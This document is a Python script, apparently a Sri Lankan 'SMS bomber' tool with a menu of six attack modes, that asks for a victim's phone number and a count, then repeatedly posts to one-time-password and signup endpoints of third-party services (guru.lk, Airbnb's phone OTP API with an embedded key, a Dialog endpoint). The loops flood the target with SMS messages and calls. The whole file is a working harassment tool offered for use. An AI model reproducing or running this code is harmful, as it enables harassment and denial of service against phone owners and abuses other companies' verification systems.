
import urllib

import os

os.system('clear')

Rathu = '\033[1;31m'
Kola = '\033[1;32m'
Kaha = '\033[1;33m'
Nil   = '\033[1;34m'
Dam   = '\033[1;35m'
LaNil = '\033[1;36m'
SUDU  = '\033[1;37m'
Alu   = '\033[90m'

name = """ 
\033[1;32;40m   ____________________________________________________________
\033[1;32m  /                                                            \033[1;32m\ 
\033[1;32m /\033[1;36m          _____                                               \033[1;32m\                                          
\033[1;36m           / ___/\033[1;34m____  ____ _____ ___  ____ ___  ___  _____
\033[1;36m           \__ \/ __ \/ __ `/ __ `__ \/ __ `__ \/ _ \/ ___/   
\033[1;36m          ___/ /\033[1;34m /_/ / /_/ / / / / / / / / / / /  __/ /    
\033[1;36m         /____/\033[1;36m .___/\__,_/_/ /_/ /_/_/ /_/ /_/\___/_/     
\033[1;34m             /_/                                           
\033[1;32;40m       ====================================================    
 \033[1;32m\\\033[1;35;40m        [+] \033[1;37mTool By \033[90mSHASHIMAL \033[1;36mVISHWAJITH \033[1;32m<\033[90mOnly For IPv_404\033[1;32m>\033[1;32m           / 
  \033[1;32m\\\033[1;32;40m____________________________________________________________\033[1;32m/ 

         \033[1;35m[1] \033[1;33mCALL Bomber          \033[1;35m[2] \033[1;33mSL SMS BOMBER
         \033[1;35m[3] \033[1;33mAnon SMS BOMBER      \033[1;35m[4] \033[1;33mMULTI SMS BOMBER
         \033[1;35m[5] \033[1;33mMULTI BOMBER         \033[1;35m[6] \033[1;33mDIALOG BOMBER
"""

print(name, "\n")


try:
    import requests

except ImportError:
    print('%s Requests isn\'t installed, installing now.')
    os.system('pip3 install requests')
    print('-> Requests has been installed.')
    os.system('clear')
    import requests

    

    
def slsms():
    print('\n     Enter Phone Number ex- (769876576)\n\033[1;36m------------------------------------------')
    x = str(input("   >>> [+94] - "))
    y="94"+x
    myobj = {"phone": x, "course": 26,
             "sesskey": "Kv3AydSYbO", "action": "sms_reg"}
    url = "https://guru.lk/auth/headstart/ajax.php"
    data = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"}
    url2    = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    m = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"CALL"}
    u = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    s = int(input("   >> Amount - "))
    print("\n   \033[1;32m>>  Blasting - ", x,"\n------------------------------------------")
    ss = 0
    while s > ss:
        requests.post(url, data=myobj)
        print('\033[1;37m   >> ',1+ss, "SMS Sent")
        ss += 1
        
    print("    >>>   D0NE    <<<")
    again()
def anonsms():
    print('\n     Enter Phone Number ex- (769876576)\n\033[1;36m------------------------------------------')
    x = str(input("   >>> [+94] - "))
    y="94"+x
    myobj = {"phone": x, "course": 26,
             "sesskey": "Kv3AydSYbO", "action": "sms_reg"}
    url = "https://guru.lk/auth/headstart/ajax.php"
    data = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"}
    url2    = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    m = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"CALL"}
    u = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    s = int(input("   >> Amount - "))
    print("\n   \033[1;32m>>  Blasting - ", x,"\n------------------------------------------")
    ss = 0
    while s > ss:
        requests.post(url2,json=data)
        print('\033[1;37m   >> ',1+ss, "SMS Sent")
        ss += 1
    print("    >>>   D0NE    <<<")
    again()
def multisms():
    print('\n     Enter Phone Number ex- (769876576)\n\033[1;36m------------------------------------------')
    x = str(input("   >>> [+94] - "))
    y="94"+x
    myobj = {"phone": x, "course": 26,
             "sesskey": "Kv3AydSYbO", "action": "sms_reg"}
    url = "https://guru.lk/auth/headstart/ajax.php"
    data = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"}
    url2    = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    m = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"CALL"}
    u = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    s = int(input("   >> Amount - "))
    print("\n   \033[1;32m>>  Blasting - ", x,"\n------------------------------------------")
    ss = 0
    while s > ss:
        requests.post(url, data=myobj)
        print('\033[1;37m   >> ',1+ss, "SMS Sent")
        ss += 1
        requests.post(url2,json=data)
        print('\033[1;37m   >> ',1+ss, "SMS Sent")
        ss += 1
    print("    >>>   D0NE    <<<")
    again()
def call():
    print('\n     Enter Phone Number ex- (769876576)\n\033[1;36m------------------------------------------')
    x = str(input("   >>> [+94] - "))
    y="94"+x
    myobj = {"phone": x, "course": 26,
             "sesskey": "Kv3AydSYbO", "action": "sms_reg"}
    url = "https://guru.lk/auth/headstart/ajax.php"
    data = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"}
    url2    = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    m = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"CALL"}
    u = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    s = int(input("   >> Amount - "))
    print("\n   \033[1;32m>>  Blasting - ", x,"\n------------------------------------------")
    ss = 0
    while s > ss:

        requests.post(u,json=m)
        print('\033[1;37m   >> ',1+ss, "Call Sent")
        ss += 1
    print("    >>>   D0NE    <<<")
    again()
def multi():
    print('\n     Enter Phone Number ex- (769876576)\n\033[1;36m------------------------------------------')
    x = str(input("   >>> [+94] - "))
    y="94"+x
    myobj = {"phone": x, "course": 26,
             "sesskey": "Kv3AydSYbO", "action": "sms_reg"}
    url = "https://guru.lk/auth/headstart/ajax.php"
    data = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"}
    url2    = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    m = {"phoneNumber":y,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"CALL"}
    u = "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id"
    s = int(input("   >> Amount - "))
    print("\n   \033[1;32m>>  Blasting - ", x,"\n------------------------------------------")
    ss = 0
    c=0
    while s > ss:
        requests.post(url, data=myobj)
        print('\033[1;37m   >> ',1+ss, "SMS Sent")
        ss += 1
        requests.post(url2,json=data)
        print('\033[1;37m   >> ',1+ss, "SMS Sent",end="")
        ss += 1
        requests.post(u,json=m)
        c+=1
        print(" +",c,"call sent\n")
        
    print("\n    >>>   D0NE    <<<")
    again()

def dialog():
    print('\n     Enter Phone Number ex- (769876576)\n\033[1;36m------------------------------------------')
    x = str(input("   >>> [+94] - "))
    data = {"mobile":x}
    url = "https://megarun.dialog.lk/api/v2/user"
    ss = 0
    s = int(input("   >> Amount - "))
    print("\n   \033[1;32m>>  Blasting - ", x,"\n------------------------------------------")
    while s> ss:
        requests.post(url,data=data)
        print('\033[1;37m   >> ',1+ss, "SMS")
        ss += 1
    print("    >>>   D0NE    <<<")
    again()

def main():
    index = int(input("\033[1;37m SPM >> "))
    
    if index == 1:
        call()
    elif index == 2:
        slsms()
    elif index == 3:
        anonsms()
    elif index == 4:
        multisms()
    elif index == 5:
        multi()
    elif index ==6:
        dialog()

    else:
        print("ERROR")
        again()

def again():
    again = input('\nDo You want again use SPAMMER (y/n) - ')
    if again == "y" or again =="Y":
        main()
    elif again == "n" or again =="N":
        quit()
    else:
        print('Enter valid letter')
        again()


    
    
if __name__ == '__main__':
    main()
    
